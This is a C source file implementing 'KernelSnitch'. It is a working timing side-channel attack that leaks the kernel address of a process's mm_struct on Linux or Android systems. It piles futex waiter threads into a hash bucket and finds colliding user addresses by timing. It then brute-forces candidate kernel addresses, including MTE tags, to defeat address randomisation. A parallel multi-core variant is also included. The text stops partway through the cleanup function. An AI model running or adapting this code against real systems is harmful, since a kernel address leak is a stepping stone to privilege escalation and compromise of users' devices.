/*
 * Finds a candidate mm_struct address through futex hash collisions. Times
 * bucket traversal, confirms colliding user addresses, and tests candidate
 * kernel addresses against those collisions.
 */
#pragma once

#include "counter_timing.h"
#include "sidechannel_utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <limits.h>
#include <stdatomic.h>

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#ifndef APPENDED_FUTEXES
#define APPENDED_FUTEXES 4096
#endif
#define MULITPLE 4
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
#define COARSE_SZ (1ULL << 30)

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;
    size_t appended_futexes;
    size_t repeat_measurement;
    size_t average;
    size_t collision_confirmations;
    size_t collision_baseline;
    size_t collision_threshold;
    size_t collision_min_time;
    size_t confirmed_collisions;

    volatile unsigned char *futexes;
    _Alignas(4) volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *times;
    volatile size_t found;
    volatile size_t mm_struct;

    pthread_t *tids;
    pthread_t *increase_tids;
    size_t increase_count;
    size_t increase_id;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    size_t identity_start;
    size_t identity_end;
#endif
    size_t identity_diff;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    size_t min_object_index;
    size_t max_object_index;
    int exact_identity_partition;
#endif

    enum kernelsnitch_state state;

    int mte_enabled;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    size_t id;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t id = inc_arg->id;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    ks->increase_tids = calloc(amount, sizeof(*ks->increase_tids));
    ASSERT_pr((ks->increase_tids != NULL), "failed to allocate futex waiter ids\n");
    ks->increase_count = amount;
    ks->increase_id = id;
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        inc_arg->id = id;
        inc_arg->ks = ks;
        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase,
                              (void *)inc_arg));
    }
    WAIT();
}

static void __decrease(struct kernelsnitch_shared_state *ks)
{
    if (!ks->increase_tids)
        return;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[ks->increase_id],
                   FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL, 0));
    for (size_t i = 0; i < ks->increase_count; ++i)
        SYSCHK(pthread_join(ks->increase_tids[i], NULL));
    free(ks->increase_tids);
    ks->increase_tids = NULL;
    ks->increase_count = 0;
}

/**
 * Simple compare
 */
#ifndef REPEAT_MEASUREMENT
#define REPEAT_MEASUREMENT 128
#endif
#ifndef AVERAGE
#define AVERAGE (1<<3)
#endif
#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
#endif
static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(
    struct kernelsnitch_shared_state *ks, size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < ks->repeat_measurement; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, ks->repeat_measurement, sizeof(size_t), __compare);
    for (size_t l = 0; l < ks->average; ++l)
        time += __times[l];
    time /= ks->average;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        if ((coarse_addr % (1ULL << 40)) == 0)
            if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
        size_t coarse_end = coarse_addr + COARSE_SZ;
        if (ks->exact_identity_partition && coarse_end > range->end)
            coarse_end = range->end;
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
            size_t first_candidate =
                slab_addr + ks->min_object_index * ks->mm_struct_sz;
            size_t candidate_end =
                slab_addr + (ks->max_object_index + 1) * ks->mm_struct_sz;
            if (candidate_end > slab_addr + mm_slab_sz)
                candidate_end = slab_addr + mm_slab_sz;
            for (size_t mm_struct_candidate = first_candidate; (mm_struct_candidate < candidate_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
#else
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
#endif

                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate
                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
                    if (found_hash) {
                        ks->mm_struct = mm_struct_candidate;
                        ks->found = 1;
                        break;
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
                         tag_candidate < 16 && !ks->found;
#else
                         tag_candidate < 15 && !ks->found;
#endif
                         ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            ks->mm_struct = __mm_struct_candidate;
                            ks->found = 1;
                            break;
                        }
                    }
                }
            }
        }
    }
    free(mm_leak_arg);
    return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->mm_struct = -1;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;
    ks->appended_futexes = APPENDED_FUTEXES;
    ks->repeat_measurement = REPEAT_MEASUREMENT;
    ks->average = AVERAGE;
    ks->collision_confirmations = KERNELSNITCH_COLLISION_CONFIRMATIONS;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    ks->identity_start = IDENTITY_START;
    ks->identity_end = IDENTITY_END;
    ks->identity_diff =
        (ks->identity_end - ks->identity_start) / ks->thread_cnt;
    ks->min_object_index = 0;
    ks->max_object_index =
        ((KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz) - 1;
    ks->exact_identity_partition = 0;
#else
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);
#endif

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));

    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(0);
    futex_init();

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

void kernelsnitch_set_profile(
    struct kernelsnitch_shared_state *ks, size_t appended_futexes,
    size_t repeat_measurement, size_t average)
{
    ASSERT_pr((appended_futexes > 0), "invalid appended futex count\n");
    ASSERT_pr((repeat_measurement > 0 &&
               repeat_measurement <= REPEAT_MEASUREMENT),
              "invalid measurement count\n");
    ASSERT_pr((average > 0 && average <= repeat_measurement),
              "invalid measurement average\n");
    ks->appended_futexes = appended_futexes;
    ks->repeat_measurement = repeat_measurement;
    ks->average = average;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
void kernelsnitch_set_search_bounds(
    struct kernelsnitch_shared_state *ks, size_t identity_start,
    size_t identity_end, size_t min_object_index, size_t max_object_index,
    int exact_identity_partition)
{
    size_t objects_per_slab =
        (KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz;
    ASSERT_pr((identity_start < identity_end),
              "invalid KernelSnitch identity bounds\n");
    ASSERT_pr((min_object_index < objects_per_slab),
              "invalid KernelSnitch minimum object index\n");
    ASSERT_pr((min_object_index <= max_object_index &&
               max_object_index < objects_per_slab),
              "invalid KernelSnitch maximum object index\n");
    ks->identity_start = identity_start;
    ks->identity_end = identity_end;
    ks->identity_diff =
        (ks->identity_end - ks->identity_start) / ks->thread_cnt;
    ks->min_object_index = min_object_index;
    ks->max_object_index = max_object_index;
    ks->exact_identity_partition = exact_identity_partition;
}
#endif

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 10
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions - 1;

    size_t approx_time = MIN(
        __measure(ks, (size_t)&ks->futexes[0]),
        __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
    ks->collision_baseline = approx_time;
    ks->collision_threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
    ks->collision_min_time = (size_t)-1;
    ks->confirmed_collisions = 0;

    // piled-up hash bucket ID 128
    // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
    __increase(ks, ID, ks->appended_futexes);
    if (ks->verbose) pr_info("start finding collisisons\n");

    // find futex user space address which collide with the piled-up hash bucket ID 128
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times[i] = __measure(ks, futex_addr);
        if (ks->times[i] > ks->collision_threshold) {
            int confirmed = 1;
            size_t min_time = ks->times[i];
            for (size_t confirmation = 1;
                 confirmation < ks->collision_confirmations;
                 ++confirmation) {
                size_t confirmation_time = __measure(ks, futex_addr);
                if (confirmation_time < min_time)
                    min_time = confirmation_time;
                if (confirmation_time <= ks->collision_threshold) {
                    confirmed = 0;
                    break;
                }
            }
            if (!confirmed)
                continue;
            count++;
            if (min_time < ks->collision_min_time)
                ks->collision_min_time = min_time;
            ks->futex_addrs[count] = futex_addr;
            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
        }
    }
    ks->confirmed_collisions = count;
    if (wanted == count) {
        if (ks->verbose) pr_info("found %zd collisisons\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd collisions -> cannot continue\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
    __decrease(ks);
}
/****************************************************************************************************************/
/* Parallel multi-core collision search                                                                     */
/*                                                                                                              */
/* Same contract as kernelsnitch_find_collisions(): piles ks->appended_futexes waiters into bucket ID and      */
/* fills ks->futex_addrs[1..collisions-1] with colliding user addresses, then sets ks->confirmed_collisions    */
/* and ks->state. Differences:                                                                                 */
/*   - the candidate scan is sharded (strided) across every online CPU, one worker pinned per core;            */
/*   - each worker builds its OWN per-core timing baseline, so the prime/perf/efficiency cores of a big.LITTLE */
/*     SoC each get a fair threshold;                                                                          */
/*   - the estimator is min-of-K instead of avg-of-lowest-8-of-64: no qsort; a second sampling window           */
/*     confirms candidates that exceed the per-core empty-bucket threshold;                                   */
/*   - every worker early-exits through an atomic slot counter the instant `wanted` collisions are claimed.    */
/****************************************************************************************************************/
#ifndef KS_PAR_SCREEN_SAMPLES
#define KS_PAR_SCREEN_SAMPLES 8
#endif
#ifndef KS_PAR_CONFIRM_SAMPLES
#define KS_PAR_CONFIRM_SAMPLES 24
#endif
#ifndef KS_PAR_BASELINE_SAMPLES
#define KS_PAR_BASELINE_SAMPLES 32
#endif

/* min-of-`samples` FUTEX_WAKE(val=0) latency: pure hash-bucket traversal cost.
 * min is the robust timing estimator here - scheduling noise can only push a
 * sample up, never below the true traversal cost, so the minimum is clean. */
static size_t __measure_min(size_t futex_addr, size_t samples)
{
    size_t best = (size_t)-1;
    for (size_t l = 0; l < samples; ++l) {
        size_t t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        size_t t1 = rdtsc_end();
        size_t d = t1 - t0;
        if (d < best)
            best = d;
    }
    return best;
}

struct ks_par_ctx {
    struct kernelsnitch_shared_state *ks;
    size_t nworkers;
    size_t wanted;
    size_t threshold_mult;
    atomic_size_t next_slot;   /* claims into ks->futex_addrs[1..wanted]   */
    atomic_int stop;           /* raised once `wanted` collisions are found */
};

struct ks_par_worker {
    struct ks_par_ctx *ctx;
    size_t id;
    int cpu;
};

static void *__ks_par_worker(void *arg)
{
    struct ks_par_worker *w = (struct ks_par_worker *)arg;
    struct ks_par_ctx *ctx = w->ctx;
    struct kernelsnitch_shared_state *ks = ctx->ks;

    /* dedicate this worker to a single core */
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(w->cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);

    /* per-core baseline: fastest wake of a couple of known-empty buckets */
    size_t base = __measure_min((size_t)&ks->futexes[0], KS_PAR_BASELINE_SAMPLES);
    size_t base2 = __measure_min((size_t)&ks->futexes[KS_PAGE_SIZE + 8], KS_PAR_BASELINE_SAMPLES);
    if (base2 < base)
        base = base2;
    size_t threshold = base * ctx->threshold_mult;

    for (size_t i = 2 + w->id; i < ks->total_futexes; i += ctx->nworkers) {
        if (atomic_load_explicit(&ctx->stop, memory_order_relaxed))
            break;
        size_t id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        size_t futex_addr = (size_t)&ks->futexes[id];

        if (__measure_min(futex_addr, KS_PAR_SCREEN_SAMPLES) <= threshold)
            continue;
        /* confirm with a longer min window; a fast bucket cannot survive it */
        size_t tc = __measure_min(futex_addr, KS_PAR_CONFIRM_SAMPLES);
        if (tc <= threshold)
            continue;

        size_t slot = atomic_fetch_add_explicit(&ctx->next_slot, 1, memory_order_relaxed);
        if (slot >= ctx->wanted) {
            atomic_store_explicit(&ctx->stop, 1, memory_order_relaxed);
            break;
        }
        ks->futex_addrs[slot + 1] = futex_addr;
        if (slot + 1 == ctx->wanted)
            atomic_store_explicit(&ctx->stop, 1, memory_order_relaxed);
    }
    return NULL;
}

/* A shared mapping holds the waiter stacks. This reduces stack allocation
 * overhead, but pthread lifecycle still dominates measured runtime on bionic.
 * The caller selects the waiter count through the KernelSnitch profile. */
#ifndef KS_WAITER_STACK
#define KS_WAITER_STACK (128 * 1024)
#endif
struct ks_pile {
    void *stacks;       /* single mmap backing every waiter stack */
    size_t stacks_len;
};
static unsigned int *__ks_gate(struct kernelsnitch_shared_state *ks, size_t id)
{
    assert((id & 3) == 0);
    return (unsigned int *)(void *)ks->inc_futex + id / 4;
}
static void *__do_increase_fast(void *arg)
{
    struct inc_arg *inc_arg = arg;
    unsigned int *gate = __ks_gate(inc_arg->ks, inc_arg->id);
    int ret = __futex(gate, FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
    /* EAGAIN means teardown closed the gate before this thread waited. */
    if (ret == -1 && errno != EAGAIN)
        pr_error("futex waiter: %m\n");
    free(inc_arg);
    return NULL;
}
static void __increase_fast(struct kernelsnitch_shared_state *ks, size_t id,
                            size_t amount, struct ks_pile *pile)
{
    /* A late starter must observe the closed gate instead of sleeping after
     * the final wake. The futex word is four-byte aligned (ID is 128). */
    __atomic_store_n(__ks_gate(ks, id), 0, __ATOMIC_RELEASE);
    size_t slice = KS_WAITER_STACK;
    pile->stacks_len = amount * slice;
    pile->stacks = SYSCHK(mmap(0, pile->stacks_len, PROT_READ | PROT_WRITE,
                               MAP_ANON | MAP_PRIVATE | MAP_NORESERVE, -1, 0));

    ks->increase_tids = calloc(amount, sizeof(*ks->increase_tids));
    ASSERT_pr((ks->increase_tids != NULL), "failed to allocate futex waiter ids\n");
    ks->increase_count = amount;
    ks->increase_id = id;

    pthread_attr_t attr;
    ASSERT_pr(pthread_attr_init(&attr) == 0, "pthread_attr_init failed\n");
    ASSERT_pr(pthread_attr_setguardsize(&attr, 0) == 0,
              "pthread_attr_setguardsize failed\n");

    for (size_t i = 0; i < amount; ++i) {
        void *stack = (unsigned char *)pile->stacks + i * slice;
        ASSERT_pr(pthread_attr_setstack(&attr, stack, slice) == 0,
                  "pthread_attr_setstack failed\n");
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        ASSERT_pr(inc_arg != NULL, "waiter argument allocation failed\n");
        inc_arg->id = id;
        inc_arg->ks = ks;
        ASSERT_pr(pthread_create(&ks->increase_tids[i], &attr,
                                 __do_increase_fast, inc_arg) == 0,
                  "pthread_create failed\n");
    }
    pthread_attr_destroy(&attr);
    WAIT();
}

/* Close the gate before waking so late starters cannot sleep past the wake. */
static void __decrease_fast(struct kernelsnitch_shared_state *ks, struct ks_pile *pile)
{
    if (!ks->increase_tids)
        return;
    __atomic_store_n(__ks_gate(ks, ks->increase_id), 1,
                     __ATOMIC_RELEASE);
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[ks->increase_id],
                   FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL, 0));
    for (size_t i = 0; i < ks->increase_count; ++i)
        ASSERT_pr(pthread_join(ks->increase_tids[i], NULL) == 0,
                  "pthread_join failed\n");
    free(ks->increase_tids);
    ks->increase_tids = NULL;
    ks->increase_count = 0;
    if (pile->stacks)
        munmap(pile->stacks, pile->stacks_len);
    pile->stacks = NULL;
}

void kernelsnitch_find_collisions_parallel(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");

    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu < 1)
        ncpu = 1;
    size_t nworkers = (size_t)ncpu;
    size_t wanted = ks->collisions - 1;

    ks->confirmed_collisions = 0;
    ks->collision_min_time = (size_t)-1;

    int counter_timing = (getenv("KS_TIMING") != NULL);
    size_t __t_pile0 = counter_timing ? gettime_ns() : 0;

    /* pile the target bucket (shared-stack waiters for a cheap create/join) */
    struct ks_pile pile = {0};
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    __increase_fast(ks, ID, ks->appended_futexes, &pile);
    size_t __t_pile1 = counter_timing ? gettime_ns() : 0;
    if (ks->verbose) pr_info("start finding collisisons (parallel, %zd workers)\n", nworkers);

    struct ks_par_ctx ctx;
    ctx.ks = ks;
    ctx.nworkers = nworkers;
    ctx.wanted = wanted;
    ctx.threshold_mult = KERNELSNITCH_THRESHOLD_MULT;
    atomic_init(&ctx.next_slot, 0);
    atomic_init(&ctx.stop, 0);

    pthread_t *wt = (pthread_t *)calloc(nworkers, sizeof(*wt));
    struct ks_par_worker *wa = (struct ks_par_worker *)calloc(nworkers, sizeof(*wa));
    ASSERT_pr((wt != NULL && wa != NULL), "failed to allocate parallel workers\n");
    for (size_t i = 0; i < nworkers; ++i) {
        wa[i].ctx = &ctx;
        wa[i].id = i;
        wa[i].cpu = (int)(i % nworkers);
        SYSCHK(pthread_create(&wt[i], NULL, __ks_par_worker, &wa[i]));
    }
    for (size_t i = 0; i < nworkers; ++i)
        pthread_join(wt[i], NULL);
    free(wt);
    free(wa);

    size_t __t_scan1 = counter_timing ? gettime_ns() : 0;

    size_t count = atomic_load(&ctx.next_slot);
    if (count > wanted)
        count = wanted;
    for (size_t i = 1; i <= count; ++i) {
        size_t measured = __measure_min(ks->futex_addrs[i],
                                        KS_PAR_CONFIRM_SAMPLES);
        if (measured < ks->collision_min_time)
            ks->collision_min_time = measured;
    }
    ks->confirmed_collisions = count;
    if (count == wanted) {
        if (ks->verbose) pr_info("found %zd collisisons\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd collisions -> cannot continue\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
    __decrease_fast(ks, &pile);
    if (counter_timing) {
        size_t __t_dec1 = gettime_ns();
        fprintf(stderr, "    [timing] pile=%.1f ms  scan=%.1f ms  decrease=%.1f ms\n",
                (__t_pile1 - __t_pile0) / 1.0e6, (__t_scan1 - __t_pile1) / 1.0e6,
                (__t_dec1 - __t_scan1) / 1.0e6);
    }
}

size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
        mm_leak_arg->range.start =
            ks->identity_start + ks->identity_diff*i;
        mm_leak_arg->range.end = i + 1 == ks->thread_cnt
            ? ks->identity_end
            : ks->identity_start + ks->identity_diff*(i+1);
        if (ks->exact_identity_partition) {
            size_t slab_size = KS_PAGE_SIZE << ks->mm_slab_order;
            mm_leak_arg->range.start &= ~(slab_size - 1);
            mm_leak_arg->range.end &= ~(slab_size - 1);
            if (mm_leak_arg->range.start < ks->identity_start)
                mm_leak_arg->range.start = ks->identity_start;
            if (mm_leak_arg->range.end > ks->identity_end)
                mm_leak_arg->range.end = ks->identity_end;
        } else {
            if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
                mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
            if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
                mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
        }
#else
        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
#endif
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i)
        pthread_join(ks->tids[i], 0);
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    /* Fail-closed callers may discard an initialized or collision-only
